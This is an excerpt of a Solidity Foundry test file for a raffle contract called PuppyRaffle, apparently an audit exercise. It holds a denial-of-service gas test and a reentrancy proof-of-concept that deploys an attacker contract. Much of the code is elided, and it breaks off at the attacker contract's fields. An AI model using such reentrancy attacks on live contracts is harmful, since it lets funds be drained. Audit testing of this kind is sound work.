...
contract PuppyRaffleTest is Test {
    ...
    function test_DOS() public {
        ...
        // see how much gast it costs to enter
        ...
        uint256 gasUsedFirstTwo = (gasStartTwo - gasEndTwo) * tx.gasprice;
        console.log("Gas used to enter second 100 players: ", gasUsedFirstTwo);
    }
    ...
    function test_canReEnter() public {
        ...
        PuppyRaffleReEnterTest reEnterTest = new PuppyRaffleReEnterTest(
            puppyRaffle
        );
        address reEnterTestAddress = makeAddr("reEnterTest");
        vm.deal(reEnterTestAddress, 1 ether);

        // set beginning balance for reEnterTest and puppyRaffle
        uint256 balanceBefore = address(reEnterTest).balance;
        uint256 raffleBalanceBefore = address(puppyRaffle).balance;

        //attack
        vm.prank(reEnterTestAddress);
        reEnterTest.reEnter{value: entranceFee}();

        //log balance after attack
        uint256 balanceAfter = address(reEnterTest).balance;
        uint256 raffleBalanceAfter = address(puppyRaffle).balance;
        console.log("reEnterTest balance: ", balanceAfter);
        console.log("puppyRaffle balance: ", raffleBalanceAfter);
    }
...
// create contract to test re-entering the raffle
contract PuppyRaffleReEnterTest {
    PuppyRaffle puppyRaffle;
    uint256 entranceFee;
    uint256 attackerIdx;
